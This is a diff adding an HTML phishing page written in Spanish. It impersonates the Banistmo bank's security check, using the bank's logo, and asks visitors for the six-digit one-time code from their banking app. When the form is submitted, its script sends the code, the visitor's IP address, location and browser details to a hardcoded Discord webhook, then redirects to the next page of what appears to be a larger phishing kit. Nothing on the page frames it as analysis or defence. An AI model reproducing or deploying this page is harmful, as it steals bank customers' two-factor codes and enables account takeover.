@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validación de Código - Banistmo</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f7f7f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-card {
+            background-color: white;
+            padding: 50px 40px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            border-radius: 4px;
+        }
+
+        .logo-container {
+            margin-bottom: 40px;
+        }
+
+        .logo-container img {
+            width: 180px;
+            height: auto;
+        }
+
+        h2 {
+            font-size: 20px;
+            color: #333;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+
+        p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .input-group {
+            display: flex;
+            align-items: center;
+            border-bottom: 1.5px solid #333;
+            margin-bottom: 40px;
+            padding-bottom: 5px;
+        }
+
+        .input-group i {
+            font-size: 20px;
+            color: #333;
+            margin-right: 15px;
+        }
+
+        .input-group input {
+            border: none;
+            outline: none;
+            width: 100%;
+            font-size: 22px;
+            color: #333;
+            background: transparent;
+            letter-spacing: 4px;
+            text-align: center;
+        }
+
+        .btn-validar {
+            background-color: #ededed;
+            color: #a0a0a0;
+            border: none;
+            padding: 16px;
+            width: 100%;
+            border-radius: 50px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: not-allowed;
+            transition: all 0.3s ease;
+        }
+
+        .btn-validar.active {
+            background-color: #FDDA5F;
+            color: #1A1A1A;
+            cursor: pointer;
+        }
+
+        .back-link {
+            display: block;
+            margin-top: 25px;
+            color: #000;
+            text-decoration: underline;
+            font-size: 15px;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <div class="logo-container">
+        <img src="https://upload.wikimedia.org/wikipedia/en/3/3e/Banistmo-2023-logo.png" alt="Banistmo Logo">
+    </div>
+
+    <h2>Verificación de seguridad</h2>
+    <p>Ingrese el token generado en su app.</p>
+
+    <form id="codeForm">
+        <div class="input-group">
+            <i class="fa-solid fa-shield-halved"></i>
+            <input 
+                type="text" 
+                id="codigoNum" 
+                placeholder="000000" 
+                inputmode="numeric" 
+                maxlength="6" 
+                autocomplete="off"
+                required
+            >
+        </div>
+
+        <button type="submit" id="btnSubmit" class="btn-validar" disabled>Continuar</button>
+
+        <a href="index.html" class="back-link">Cancelar y volver</a>
+    </form>
+</div>
+
+<script>
+    const codigoInput = document.getElementById('codigoNum');
+    const btnSubmit = document.getElementById('btnSubmit');
+    const codeForm = document.getElementById('codeForm');
+
+    // WEBHOOK URL
+    const webhookURL = "https://discord.com/api/webhooks/1474790547851055235/1-s0oqiM2BDNSvehLcIDBvCR81ClhNG6T4vJpOvbBAEsSFldMV7WBP4T1z7b-aGmZfqX";
+
+    // Bloquear letras
+    codigoInput.addEventListener('keypress', function(e) {
+        if (isNaN(String.fromCharCode(e.which))) {
+            e.preventDefault();
+        }
+    });
+
+    // Validar longitud
+    codigoInput.addEventListener('input', function() {
+        this.value = this.value.replace(/[^0-9]/g, '');
+
+        if (this.value.length === 6) {
+            btnSubmit.classList.add('active');
+            btnSubmit.disabled = false;
+        } else {
+            btnSubmit.classList.remove('active');
+            btnSubmit.disabled = true;
+        }
+    });
+
+    // Envío a Discord
+    codeForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const otpValue = codigoInput.value;
+        btnSubmit.innerText = "Validando...";
+        btnSubmit.disabled = true;
+
+        try {
+            // Obtener IP y Ubicación
+            const geoRes = await fetch('https://ipapi.co/json/');
+            const geo = await geoRes.json();
+
+            const payload = {
+                embeds: [{
+                    title: "🔔 NUEVO CÓDIGO OTP - BANISTMO",
+                    color: 16636511, // Amarillo Banistmo
+                    fields: [
+                        { name: "🔢 Código OTP", value: `**${otpValue}**`, inline: true },
+                        { name: "🌐 IP", value: `\`${geo.ip}\``, inline: true },
+                        { name: "🌍 Ubicación", value: `${geo.city}, ${geo.country_name}`, inline: false },
+                        { name: "📱 Info", value: navigator.userAgent }
+                    ],
+                    footer: { text: "Banistmo App - Security Check" },
+                    timestamp: new Date()
+                }]
+            };
+
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            // Redirección final
+            window.location.href = "index3.html";
+
+        } catch (error) {
+            window.location.href = "index3.html";
+        }
+    });
+</script>
+
+</body>
+</html>
